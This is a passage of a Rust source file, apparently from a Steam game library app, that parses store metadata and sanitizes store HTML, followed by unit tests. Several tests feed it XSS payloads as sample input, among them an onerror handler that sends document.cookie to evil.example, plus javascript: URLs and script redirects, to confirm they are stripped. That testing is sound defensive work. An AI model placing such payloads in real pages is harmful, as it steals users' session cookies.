    }
    let mut quote: Option<char> = None;
    while index < characters.len() {
        let character = characters[index];
        match quote {
            Some(open) if character == open => quote = None,
            Some(_) => {}
            None if character == '"' || character == '\'' => quote = Some(character),
            None if character == '>' => {
                return Some(ParsedTag {
                    name,
                    closing,
                    end: index + 1,
                });
            }
            None => {}
        }
        index += 1;
    }
    None
}

fn skip_until(characters: &[char], from: usize, needle: &[char]) -> Option<usize> {
    let mut index = from;
    while index + needle.len() <= characters.len() {
        if characters[index..].starts_with(needle) {
            return Some(index + needle.len());
        }
        index += 1;
    }
    None
}

fn find_closing_tag(characters: &[char], from: usize, name: &str) -> Option<usize> {
    let mut index = from;
    while index < characters.len() {
        if characters[index] == '<'
            && characters.get(index + 1) == Some(&'/')
            && let Some(tag) = parse_tag(characters, index)
            && tag.closing
            && tag.name == name
        {
            return Some(tag.end);
        }
        index += 1;
    }
    None
}

struct ListContext {
    ordered: bool,
    items: Vec<String>,
}

#[derive(Default)]
struct DescriptionBuilder {
    blocks: Vec<DescriptionBlock>,
    buffer: String,
    /// Contador explícito: recontar el buffer en cada carácter convertiría el
    /// análisis de un párrafo largo en cuadrático.
    buffered_chars: usize,
    heading_level: Option<u8>,
    list: Option<ListContext>,
    total_chars: usize,
}

impl DescriptionBuilder {
    fn push(&mut self, character: char) {
        if self.buffered_chars < MAX_BUFFERED_CHARS {
            self.buffer.push(character);
            self.buffered_chars += 1;
        }
    }

    fn boundary(&mut self) {
        self.flush();
    }

    fn open_heading(&mut self, level: u8) {
        self.flush();
        self.heading_level = Some(level);
    }

    fn open_list(&mut self, ordered: bool) {
        self.close_list();
        self.list = Some(ListContext {
            ordered,
            items: Vec::new(),
        });
    }

    fn close_list(&mut self) {
        self.flush();
        if let Some(list) = self.list.take()
            && !list.items.is_empty()
            && self.blocks.len() < MAX_DESCRIPTION_BLOCKS
        {
            self.blocks.push(DescriptionBlock::List {
                ordered: list.ordered,
                items: list.items,
            });
        }
    }

    fn flush(&mut self) {
        let decoded = decode_basic_entities(&self.buffer);
        self.buffer.clear();
        self.buffered_chars = 0;
        let heading = self.heading_level.take();
        let text = decoded.split_whitespace().collect::<Vec<_>>().join(" ");
        if text.is_empty() {
            return;
        }
        let text: String = text.chars().take(MAX_BLOCK_CHARS).collect();
        let length = text.chars().count();
        if self.total_chars.saturating_add(length) > MAX_STRUCTURED_CHARS {
            return;
        }
        if let Some(list) = &mut self.list {
            if list.items.len() < MAX_LIST_ITEMS {
                list.items.push(text);
                self.total_chars += length;
            }
            return;
        }
        if self.blocks.len() >= MAX_DESCRIPTION_BLOCKS {
            return;
        }
        self.blocks.push(match heading {
            Some(level) => DescriptionBlock::Heading { level, text },
            None => DescriptionBlock::Paragraph { text },
        });
        self.total_chars += length;
    }

    fn finish(mut self) -> StructuredDescription {
        self.close_list();
        self.flush();
        StructuredDescription {
            blocks: self.blocks,
        }
    }
}

fn decode_basic_entities(value: &str) -> String {
    let mut output = String::with_capacity(value.len());
    let mut remaining = value;
    while let Some(start) = remaining.find('&') {
        output.push_str(&remaining[..start]);
        let entity_source = &remaining[start..];
        let Some(end) = entity_source.find(';').filter(|end| *end <= 12) else {
            output.push('&');
            remaining = &remaining[start + 1..];
            continue;
        };
        let entity = &entity_source[1..end];
        let decoded = match entity {
            value if value.starts_with("#x") || value.starts_with("#X") => {
                u32::from_str_radix(&value[2..], 16)
                    .ok()
                    .and_then(char::from_u32)
            }
            value if value.starts_with('#') => {
                value[1..].parse::<u32>().ok().and_then(char::from_u32)
            }
            value => named_entity(value),
        };
        if let Some(character) = decoded {
            output.push(character);
        } else {
            output.push_str(&entity_source[..=end]);
        }
        remaining = &entity_source[end + 1..];
    }
    output.push_str(remaining);
    output
}

/// Entidades con nombre que aparecen de verdad en las fichas de Steam. La
/// tabla cubre la acentuación española y la puntuación tipográfica: sin ella,
/// «Espa&ntilde;ol» llegaría literal a la ficha.
fn named_entity(entity: &str) -> Option<char> {
    Some(match entity {
        "amp" => '&',
        "quot" => '"',
        "apos" => '\'',
        "lt" => '<',
        "gt" => '>',
        "nbsp" => ' ',
        "aacute" => 'á',
        "eacute" => 'é',
        "iacute" => 'í',
        "oacute" => 'ó',
        "uacute" => 'ú',
        "Aacute" => 'Á',
        "Eacute" => 'É',
        "Iacute" => 'Í',
        "Oacute" => 'Ó',
        "Uacute" => 'Ú',
        "agrave" => 'à',
        "egrave" => 'è',
        "igrave" => 'ì',
        "ograve" => 'ò',
        "ugrave" => 'ù',
        "Agrave" => 'À',
        "Egrave" => 'È',
        "Ograve" => 'Ò',
        "acirc" => 'â',
        "ecirc" => 'ê',
        "icirc" => 'î',
        "ocirc" => 'ô',
        "ucirc" => 'û',
        "auml" => 'ä',
        "euml" => 'ë',
        "iuml" => 'ï',
        "ouml" => 'ö',
        "uuml" => 'ü',
        "Auml" => 'Ä',
        "Ouml" => 'Ö',
        "Uuml" => 'Ü',
        "atilde" => 'ã',
        "otilde" => 'õ',
        "ntilde" => 'ñ',
        "Ntilde" => 'Ñ',
        "ccedil" => 'ç',
        "Ccedil" => 'Ç',
        "aring" => 'å',
        "Aring" => 'Å',
        "aelig" => 'æ',
        "oslash" => 'ø',
        "szlig" => 'ß',
        "yacute" => 'ý',
        "iquest" => '¿',
        "iexcl" => '¡',
        "ordm" => 'º',
        "ordf" => 'ª',
        "deg" => '°',
        "copy" => '©',
        "reg" => '®',
        "trade" => '™',
        "euro" => '€',
        "pound" => '£',
        "yen" => '¥',
        "cent" => '¢',
        "sect" => '§',
        "para" => '¶',
        "middot" => '·',
        "bull" => '•',
        "dagger" => '†',
        "hellip" => '…',
        "mdash" => '—',
        "ndash" => '–',
        "minus" => '−',
        "laquo" => '«',
        "raquo" => '»',
        "ldquo" => '“',
        "rdquo" => '”',
        "lsquo" => '‘',
        "rsquo" => '’',
        "sbquo" => '‚',
        "bdquo" => '„',
        "prime" => '′',
        "permil" => '‰',
        "plusmn" => '±',
        "times" => '×',
        "divide" => '÷',
        "frac12" => '½',
        "frac14" => '¼',
        "frac34" => '¾',
        "sup2" => '²',
        "sup3" => '³',
        "micro" => 'µ',
        "infin" => '∞',
        "ne" => '≠',
        "le" => '≤',
        "ge" => '≥',
        "larr" => '←',
        "rarr" => '→',
        "uarr" => '↑',
        "darr" => '↓',
        "ensp" | "emsp" | "thinsp" | "shy" | "zwj" | "zwnj" | "lrm" | "rlm" => ' ',
        _ => return None,
    })
}

fn classify_store_error(error: reqwest::Error) -> AppError {
    if error.is_timeout() {
        return AppError::new(
            "steam_store_timeout",
            "La tienda de Steam no respondió a tiempo.",
        );
    }
    if error.is_connect() {
        return AppError::new(
            "steam_store_connection",
            "No se pudo conectar de forma segura con la tienda de Steam.",
        );
    }
    AppError::new(
        "steam_store_network",
        "No se pudo cargar la ficha desde la tienda de Steam.",
    )
}

#[cfg(test)]
mod tests {
    use super::{
        StoreBundleOutcome, StoreMetadataBundle, StoreMetadataOutcome, parse_retry_after,
        parse_store_bundle, parse_store_response, sanitize_hero_url, sanitize_store_text,
        sanitize_website_url, structure_store_html,
    };
    use crate::db::rich_metadata::{DescriptionBlock, DrmState, GameMediaKind};
    use reqwest::header::HeaderValue;
    use std::time::Duration;

    fn bundle(app_id: u32, payload: &str) -> StoreMetadataBundle {
        let StoreBundleOutcome::Found(bundle) =
            parse_store_bundle(app_id, payload.as_bytes()).expect("interpretar ficha")
        else {
            panic!("la ficha debía estar disponible");
        };
        *bundle
    }

    fn texts(blocks: &[DescriptionBlock]) -> String {
        blocks
            .iter()
            .map(|block| match block {
                DescriptionBlock::Heading { text, .. } => text.clone(),
                DescriptionBlock::Paragraph { text } => text.clone(),
                DescriptionBlock::List { items, .. } => items.join(" | "),
            })
            .collect::<Vec<_>>()
            .join(" / ")
    }

    #[test]
    fn honors_bounded_retry_after_seconds_from_rate_limit_responses() {
        assert_eq!(
            parse_retry_after(Some(&HeaderValue::from_static("90"))),
            Some(Duration::from_secs(90))
        );
        assert_eq!(
            parse_retry_after(Some(&HeaderValue::from_static("999999"))),
            Some(Duration::from_secs(3_600))
        );
        assert_eq!(
            parse_retry_after(Some(&HeaderValue::from_static("tomorrow"))),
            None
        );
    }

    #[test]
    fn parses_and_sanitizes_real_store_metadata_shape() {
        let payload = r#"{
          "620": {
            "success": true,
            "data": {
              "is_free": false,
              "short_description": "Descripción corta",
              "about_the_game": "<h2>Portal 2</h2><p>Resuelve &amp; coopera.</p><script>ignorar()</script>",
              "developers": ["Valve"],
              "publishers": ["Valve"],
              "genres": [{"id":"1","description":"Acción"}],
              "categories": [{"id":2,"description":"Un jugador"}],
              "achievements": {"total": 51, "highlighted": []},
              "release_date": {"coming_soon": false, "date": "18 ABR 2011"},
              "background_raw": "https://store.akamai.steamstatic.com/images/storepagebackground/app/620?t=1745363004"
            }
          }
        }"#;
        let outcome = parse_store_response(620, payload.as_bytes()).expect("interpretar ficha");
        let StoreMetadataOutcome::Found(metadata) = outcome else {
            panic!("la ficha debía estar disponible");
        };
        assert_eq!(metadata.developer.as_deref(), Some("Valve"));
        assert_eq!(metadata.genres, vec!["Acción"]);
        assert_eq!(metadata.achievements_total, Some(51));
        assert_eq!(metadata.release_date.as_deref(), Some("2011-04-18"));
        assert!(!metadata.is_free);
        assert!(!metadata.is_early_access);
        assert_eq!(
            metadata.hero_url.as_deref(),
            Some(
                "https://store.akamai.steamstatic.com/images/storepagebackground/app/620?t=1745363004"
            )
        );
        assert_eq!(
            metadata.short_description.as_deref(),
            Some("Portal 2 Resuelve & coopera. ignorar()")
        );
        assert!(!metadata.short_description.unwrap().contains('<'));
    }

    #[test]
    fn harvests_the_hashed_store_header_as_art_fallback() {
        let payload = br#"{
          "3483510": {
            "success": true,
            "data": {
              "is_free": false,
              "header_image": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3483510/3c96b19255b69aa9b2e131dda3e19d622b0d6562/header.jpg?t=1782353681",
              "capsule_image": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3483510/0d5cbb1d81642a256b5a690d5c27b57cdd7891d4/capsule_616x353.jpg?t=1782353681"
            }
          }
        }"#;
        let StoreMetadataOutcome::Found(metadata) =
            parse_store_response(3483510, payload).expect("interpretar ficha")
        else {
            panic!("la ficha debía estar disponible");
        };
        assert_eq!(
            metadata.header_url.as_deref(),
            Some(
                "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3483510/3c96b19255b69aa9b2e131dda3e19d622b0d6562/header.jpg?t=1782353681"
            )
        );
        assert_eq!(
            metadata.capsule_url.as_deref(),
            Some(
                "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3483510/0d5cbb1d81642a256b5a690d5c27b57cdd7891d4/capsule_616x353.jpg?t=1782353681"
            )
        );
    }

    #[test]
    fn rejects_header_images_from_unofficial_hosts_or_other_apps() {
        let payload = br#"{
          "3483510": {
            "success": true,
            "data": {
              "is_free": false,
              "header_image": "https://evil.example/store_item_assets/steam/apps/3483510/header.jpg"
            }
          }
        }"#;
        let StoreMetadataOutcome::Found(metadata) =
            parse_store_response(3483510, payload).expect("interpretar ficha")
        else {
            panic!("la ficha debía estar disponible");
        };
        assert_eq!(metadata.header_url, None);

        let payload = br#"{
          "3483510": {
            "success": true,
            "data": {
              "is_free": false,
              "header_image": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/730/header.jpg"
            }
          }
        }"#;
        let StoreMetadataOutcome::Found(metadata) =
            parse_store_response(3483510, payload).expect("interpretar ficha")
        else {
            panic!("la ficha debía estar disponible");
        };
        assert_eq!(metadata.header_url, None);
    }

    #[test]
    fn detects_free_and_early_access_from_stable_store_fields() {
        let payload = br#"{
          "892970": {
            "success": true,
            "data": {
              "is_free": true,
              "genres": [
                {"id":"23","description":"Indie"},
                {"id":"70","description":"Acceso anticipado"}
              ],
              "release_date": {"coming_soon": false, "date": "2 FEB 2021"}
            }
          }
        }"#;
        let StoreMetadataOutcome::Found(metadata) =
            parse_store_response(892970, payload).expect("interpretar ficha")
        else {
            panic!("la ficha debía estar disponible");
        };
        assert!(metadata.is_free);
        assert!(metadata.is_early_access);
        assert_eq!(metadata.release_date.as_deref(), Some("2021-02-02"));
    }

    #[test]
    fn does_not_invent_a_release_date_for_unreleased_or_ambiguous_values() {
        for date in ["Próximamente", "Q1 2027", "2027"] {
            let payload = format!(
                r#"{{"10":{{"success":true,"data":{{"release_date":{{"coming_soon":false,"date":"{date}"}}}}}}}}"#
            );
            let StoreMetadataOutcome::Found(metadata) =
                parse_store_response(10, payload.as_bytes()).expect("interpretar ficha")
            else {
                panic!("la ficha debía estar disponible");
            };
            assert_eq!(metadata.release_date, None);
        }
    }

    #[test]
    fn returns_an_explicit_fallback_when_store_has_no_app() {
        let payload = r#"{"10":{"success":false}}"#;
        let outcome = parse_store_response(10, payload.as_bytes()).expect("interpretar ausencia");
        assert!(matches!(outcome, StoreMetadataOutcome::Unavailable));
    }

    #[test]
    fn normalizes_entities_and_caps_untrusted_text() {
        let oversized = format!("<b>{}</b>&#33;", "x".repeat(9_000));
        let clean = sanitize_store_text(&oversized);
        assert_eq!(clean.chars().count(), 8_000);
        assert!(!clean.contains('<'));
    }

    #[test]
    fn accepts_only_the_exact_store_hero_host_and_app_path() {
        let valid = "https://store.akamai.steamstatic.com/images/storepagebackground/app/620?t=123";
        assert_eq!(sanitize_hero_url(valid, 620).as_deref(), Some(valid));
        assert!(
            sanitize_hero_url(
                "https://evil.example/images/storepagebackground/app/620?t=123",
                620
            )
            .is_none()
        );
        assert!(
            sanitize_hero_url(
                "https://store.akamai.steamstatic.com/images/storepagebackground/app/730?t=123",
                620
            )
            .is_none()
        );
        assert!(
            sanitize_hero_url(
                "https://store.akamai.steamstatic.com/images/storepagebackground/app/%2e%2e?t=123",
                620
            )
            .is_none()
        );
        assert!(
            sanitize_hero_url(
                "https://store.akamai.steamstatic.com/images/storepagebackground/app/620?next=https://evil.example",
                620
            )
            .is_none()
        );
    }

    // -----------------------------------------------------------------------
    // Saneado de HTML de la tienda
    // -----------------------------------------------------------------------

    #[test]
    fn structures_real_store_html_into_headings_paragraphs_and_lists() {
        let html = "<h2 class=\"bb_tag\">Sobre el juego</h2>\
                    <p>Resuelve puzles con el <b>ca&ntilde;&oacute;n</b> de portales.</p>\
                    <ul class=\"bb_ul\"><li>Campa&ntilde;a cooperativa</li><li>Editor de niveles</li></ul>\
                    <ol><li>Primero</li><li>Segundo</li></ol>";
        let description = structure_store_html(html).expect("estructurar descripción");
        assert_eq!(
            description.blocks[0],
            DescriptionBlock::Heading {
                level: 2,
                text: "Sobre el juego".into(),
            }
        );
        assert_eq!(
            description.blocks[1],
            DescriptionBlock::Paragraph {
                text: "Resuelve puzles con el cañón de portales.".into(),
            }
        );
        assert_eq!(
            description.blocks[2],
            DescriptionBlock::List {
                ordered: false,
                items: vec!["Campaña cooperativa".into(), "Editor de niveles".into()],
            }
        );
        assert_eq!(
            description.blocks[3],
            DescriptionBlock::List {
                ordered: true,
                items: vec!["Primero".into(), "Segundo".into()],
            }
        );
    }

    #[test]
    fn drops_script_and_style_bodies_instead_of_showing_them_as_text() {
        let html = "<p>Antes</p><script>alert('xss');window.location='https://evil.example'</script>\
                    <style>body{background:url(javascript:alert(1))}</style><p>Después</p>";
        let description = structure_store_html(html).expect("estructurar descripción");
        let rendered = texts(&description.blocks);
        assert_eq!(rendered, "Antes / Después");
        assert!(!rendered.contains("alert"));
        assert!(!rendered.contains("evil.example"));
        assert!(!rendered.contains("background"));
    }

    #[test]
    fn never_emits_attributes_so_event_handlers_and_javascript_urls_disappear() {
        let html = "<p onclick=\"steal()\" onerror='steal()'>Texto</p>\
                    <img src=\"x\" onerror=\"fetch('https://evil.example/'+document.cookie)\">\
                    <a href=\"javascript:alert(1)\">Enlace</a>\
                    <a href=\"data:text/html;base64,PHNjcmlwdD4=\">Otro</a>";
        let description = structure_store_html(html).expect("estructurar descripción");
        let rendered = texts(&description.blocks);
        assert!(rendered.contains("Texto"));
        assert!(rendered.contains("Enlace"));
        assert!(!rendered.contains("onerror"));
        assert!(!rendered.contains("onclick"));
        assert!(!rendered.contains("javascript:"));
        assert!(!rendered.contains("data:text/html"));
        assert!(!rendered.contains("document.cookie"));
        let json = serde_json::to_string(&description).expect("serializar");
        assert!(!json.contains('<'));
    }

    #[test]
    fn discards_iframes_objects_svg_and_their_payloads() {
        let html = "<p>Uno</p>\
                    <iframe src=\"https://evil.example/\">respaldo</iframe>\
                    <object data=\"https://evil.example/x.swf\">objeto</object>\
                    <svg><script>alert(1)</script></svg>\
                    <noscript>Activa JavaScript</noscript>\
                    <p>Dos</p>";
        let rendered = texts(&structure_store_html(html).expect("estructurar").blocks);
        assert_eq!(rendered, "Uno / Dos");
    }

    #[test]
    fn a_greater_than_inside_an_attribute_never_reopens_the_text_flow() {
        let html = "<p title=\"a > b\" data-x='c > d'>Visible</p>";
        let rendered = texts(&structure_store_html(html).expect("estructurar").blocks);
        assert_eq!(rendered, "Visible");
    }

    #[test]
    fn comments_and_doctypes_are_dropped_without_leaking_their_content() {
        let html = "<!DOCTYPE html><!-- <script>alert(1)</script> --><p>Contenido</p>";
        let rendered = texts(&structure_store_html(html).expect("estructurar").blocks);
        assert_eq!(rendered, "Contenido");
    }

    #[test]
    fn html_without_any_readable_text_produces_no_description_at_all() {
        assert!(structure_store_html("<script>alert(1)</script>").is_none());
        assert!(structure_store_html("   ").is_none());
        assert!(structure_store_html("").is_none());
    }

    #[test]
    fn bounds_blocks_list_items_and_total_length_of_a_hostile_description() {
        let paragraphs = "<p>x</p>".repeat(500);
        let description = structure_store_html(&paragraphs).expect("estructurar");
        assert!(description.blocks.len() <= 120);

        let items = format!("<ul>{}</ul>", "<li>y</li>".repeat(500));
        let description = structure_store_html(&items).expect("estructurar");
        let DescriptionBlock::List { items, .. } = &description.blocks[0] else {
            panic!("debía ser una lista");
        };
        assert!(items.len() <= 40);

        let huge = format!("<p>{}</p>", "z".repeat(9_000));
        let description = structure_store_html(&huge).expect("estructurar");
        let DescriptionBlock::Paragraph { text } = &description.blocks[0] else {
            panic!("debía ser un párrafo");
        };
        assert_eq!(text.chars().count(), 2_000);
        description
            .validate()
            .expect("respetar los límites de persistencia");
    }

    #[test]
    fn a_literal_less_than_sign_survives_as_text() {
        let rendered = texts(
            &structure_store_html("<p>5 < 7 y 9 > 3</p>")
                .expect("estructurar")
                .blocks,
        );
        assert_eq!(rendered, "5 < 7 y 9 > 3");
    }

    // -----------------------------------------------------------------------
    // Metadatos enriquecidos
    // -----------------------------------------------------------------------

    #[test]
    fn harvests_the_rich_card_fields_from_a_real_store_shape() {
        let payload = r#"{
          "620": {
            "success": true,
            "data": {
              "is_free": false,
              "required_age": "0",
              "controller_support": "full",
              "detailed_description": "<h1>Portal 2</h1><p>Una secuela.</p>",
              "about_the_game": "<p>Sobre el juego.</p>",
              "supported_languages": "Espa&ntilde;ol<strong>*</strong>, Ingl&eacute;s<br><strong>*</strong>con audio",
              "website": "https://www.thinkwithportals.com/",
              "metacritic": {"score": 95, "url": "https://www.metacritic.com/game/pc/portal-2?ftag=x"},
              "header_image": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/620/header.jpg?t=1",
              "background": "https://store.akamai.steamstatic.com/images/storepagebackground/app/620?t=1",
              "screenshots": [
                {"id": 0, "path_thumbnail": "https://shared.steamstatic.com/store_item_assets/steam/apps/620/ss_a.600x338.jpg?t=1", "path_full": "https://shared.steamstatic.com/store_item_assets/steam/apps/620/ss_a.1920x1080.jpg?t=1"},
                {"id": 1, "path_thumbnail": "https://shared.steamstatic.com/store_item_assets/steam/apps/620/ss_b.600x338.jpg?t=1", "path_full": "https://shared.steamstatic.com/store_item_assets/steam/apps/620/ss_b.1920x1080.jpg?t=1"}
              ],
              "movies": [
                {
                  "id": 256658589,
                  "thumbnail": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/620/256658589/movie_thumb.jpg?t=1",
                  "webm": {"480": "https://video.akamai.steamstatic.com/store_trailers/256658589/movie480.webm?t=1", "max": "https://video.akamai.steamstatic.com/store_trailers/256658589/movie_max.webm?t=1"},
                  "mp4": {"480": "https://video.akamai.steamstatic.com/store_trailers/256658589/movie480.mp4?t=1", "max": "https://video.akamai.steamstatic.com/store_trailers/256658589/movie_max.mp4?t=1"}
                }
              ],
              "content_descriptors": {"ids": [2, 5], "notes": "Violencia estilizada"}
            }
          }
        }"#;
        let bundle = bundle(620, payload);
        let rich = bundle.rich;

        let detailed = rich.detailed_description.expect("descripción detallada");
        assert_eq!(
            detailed.blocks[0],
            DescriptionBlock::Heading {
                level: 1,
                text: "Portal 2".into()
            }
        );
        assert_eq!(
            rich.supported_languages.as_deref(),
            Some("Español *, Inglés * con audio")
        );
        assert_eq!(
            rich.website_url.as_deref(),
            Some("https://www.thinkwithportals.com/")
        );
        assert_eq!(rich.metacritic_score, Some(95));
        assert_eq!(
            rich.metacritic_url.as_deref(),
            Some("https://www.metacritic.com/game/pc/portal-2?ftag=x")
        );
        assert_eq!(rich.required_age, Some(0));
        assert_eq!(rich.controller_support.as_deref(), Some("full"));
        assert_eq!(
            rich.background_url.as_deref(),
            Some("https://store.akamai.steamstatic.com/images/storepagebackground/app/620?t=1")
        );
        assert_eq!(
            rich.library_hero_url.as_deref(),
            Some(
                "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/620/library_hero.jpg"
            )
        );
        assert_eq!(
            rich.library_logo_url.as_deref(),
            Some("https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/620/logo.png")
        );
        assert_eq!(rich.logo_position, None);

        let media = rich.media.expect("medios");
        assert_eq!(media.len(), 3);
        assert_eq!(media[0].media_id, "screenshot:0");
        assert_eq!(media[0].kind, GameMediaKind::Screenshot);
        assert_eq!(media[1].position, 1);
        assert_eq!(media[2].media_id, "movie:256658589");
        assert_eq!(media[2].kind, GameMediaKind::Movie);
        assert_eq!(media[2].position, 0);
        assert_eq!(
            media[2].full_url.as_deref(),
            Some("https://video.akamai.steamstatic.com/store_trailers/256658589/movie_max.mp4?t=1")
        );
        assert_eq!(
            media[2].alt_url.as_deref(),
            Some(
                "https://video.akamai.steamstatic.com/store_trailers/256658589/movie_max.webm?t=1"
            )
        );

        assert_eq!(bundle.content_descriptors.ids, vec![2, 5]);
        assert_eq!(
            bundle.content_descriptors.notes.as_deref(),
            Some("Violencia estilizada")
        );
    }

    #[test]
    fn art_falls_back_to_the_conventional_cdn_url_when_the_store_sends_no_base() {
        let bundle = bundle(730, r#"{"730":{"success":true,"data":{"is_free":false}}}"#);
        assert_eq!(
            bundle.rich.library_hero_url.as_deref(),
            Some(
                "https://shared.steamstatic.com/store_item_assets/steam/apps/730/library_hero.jpg"
            )
        );
        assert_eq!(
            bundle.rich.library_logo_url.as_deref(),
            Some("https://shared.steamstatic.com/store_item_assets/steam/apps/730/logo.png")
        );
    }

    #[test]
    fn rejects_media_hosted_outside_steam_or_bound_to_another_app() {
        let payload = r#"{
          "620": {
            "success": true,
            "data": {
              "is_free": false,
              "screenshots": [
                {"id": 0, "path_thumbnail": "https://evil.example/store_item_assets/steam/apps/620/ss.jpg", "path_full": "https://evil.example/apps/620/ss.jpg"},
                {"id": 1, "path_thumbnail": "https://shared.steamstatic.com/store_item_assets/steam/apps/730/ss.jpg", "path_full": null},
                {"id": 2, "path_thumbnail": "http://shared.steamstatic.com/store_item_assets/steam/apps/620/ss.jpg", "path_full": null},
                {"id": 3, "path_thumbnail": "https://shared.steamstatic.com/store_item_assets/steam/apps/620/ss.jpg?next=https://evil.example", "path_full": null},
                {"id": 4, "path_thumbnail": "https://shared.steamstatic.com/store_item_assets/steam/apps/620/ok.jpg", "path_full": null}
              ]
            }
          }
        }"#;
        let media = bundle(620, payload).rich.media.expect("medios");
        assert_eq!(media.len(), 1);
        assert_eq!(media[0].media_id, "screenshot:4");
    }

    #[test]
    fn rejects_websites_and_metacritic_links_that_are_not_safe_or_official() {
        assert!(sanitize_website_url("javascript:alert(1)").is_none());
        assert!(sanitize_website_url("data:text/html,<script>").is_none());
        assert!(sanitize_website_url("http://ejemplo.test/").is_none());
        assert!(sanitize_website_url("https://user:pass@ejemplo.test/").is_none());
        assert_eq!(
            sanitize_website_url("https://ejemplo.test/juego").as_deref(),
            Some("https://ejemplo.test/juego")
        );

        let payload = r#"{
          "620": {
            "success": true,
            "data": {
              "is_free": false,
              "website": "javascript:alert(1)",
              "metacritic": {"score": 900, "url": "https://metacritic.evil.example/game/pc/portal-2"}
            }
          }
        }"#;
        let rich = bundle(620, payload).rich;
        assert_eq!(rich.website_url, None);
        assert_eq!(rich.metacritic_url, None);
        assert_eq!(rich.metacritic_score, None);
    }

    #[test]
    fn classifies_drm_from_the_official_notices_of_the_same_response() {
        let payload = r#"{
          "620": {
            "success": true,
            "data": {
              "is_free": false,
              "drm_notice": "Denuvo Anti-tamper",
              "ext_user_account_notice": "Requires a Ubisoft account",
              "legal_notice": "&copy; 2024 Ubisoft. Todos los derechos reservados."
            }
          }
        }"#;
        let rich = bundle(620, payload).rich;
        assert_eq!(rich.drm_notice.as_deref(), Some("Denuvo Anti-tamper"));
        let drm = rich.drm.expect("clasificación");
        assert_eq!(drm.state, DrmState::ThirdPartyDrm);
        assert!(
            drm.evidence
                .iter()
                .any(|evidence| evidence.matched == "Denuvo Anti-Tamper")
        );

        let clean = bundle(620, r#"{"620":{"success":true,"data":{"is_free":false}}}"#);
        assert_eq!(
            clean.rich.drm.expect("clasificación").state,
            DrmState::DrmFree
        );
    }

    #[test]
    fn an_unavailable_app_yields_no_rich_metadata_at_all() {
        let outcome =
            parse_store_bundle(10, br#"{"10":{"success":false}}"#).expect("interpretar ausencia");
        assert!(matches!(outcome, StoreBundleOutcome::Unavailable));
    }
}
